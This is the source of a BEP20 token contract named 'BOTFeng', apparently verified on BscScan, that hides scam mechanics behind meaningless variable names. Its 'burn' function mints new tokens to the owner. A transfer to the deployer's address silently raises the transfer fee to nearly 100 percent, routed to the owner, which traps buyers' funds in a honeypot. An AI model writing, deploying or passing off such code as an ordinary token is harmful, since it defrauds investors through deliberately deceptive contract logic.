/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.7.4;
contract BOTFeng {
address private  FVZICU = address(0);
uint256 public constant IOYWFF = 99999;
mapping (address => uint256) public balanceOf;
uint256 private  NARZSK = 1000000000000000000000;
address private  FCYKRR = address(0);
uint256 private  IIBEDJ = 10000000000000;
uint8 public constant decimals = 18;
address private  KEXYHM = address(0);
address public owner;
uint256 private  KYCAPC = 10000000000;
uint256 private  UPFMZS = 1000000000000000000;
uint256 private  XUBEBE = 100000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  SBUZCB = 1000000000000000000;
uint256 private  IJUJRJ = 1000000000000000;
string public  name = "BOTFeng";
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  KSLYDD = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public constant totalSupply = 100000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  ZLFMGD = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "BOTFeng";
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getNARZSK() private returns (uint256) {
return NARZSK;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getKSLYDD() private returns (address) {
return KSLYDD;
}

function _getKEXYHM() private returns (address) {
return KEXYHM;
}

function _getKYCAPC() private returns (uint256) {
return KYCAPC;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getFVZICU() private returns (address) {
return FVZICU;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "KADXLE");
require(to != address(0), "KADXLE");
require(amount <= balanceOf[from], "KADXLE");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* IOYWFF/SBUZCB ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ZLFMGD){
SBUZCB = IOYWFF+2;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tKADXLE 0");
require(spender != address(0), "fKADXLE 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getIIBEDJ() private returns (uint256) {
return IIBEDJ;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getXUBEBE() private returns (uint256) {
return XUBEBE;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () {
ZLFMGD = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getIJUJRJ() private returns (uint256) {
return IJUJRJ;
}

function _getFCYKRR() private returns (address) {
return FCYKRR;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getUPFMZS() private returns (uint256) {
return UPFMZS;
}


}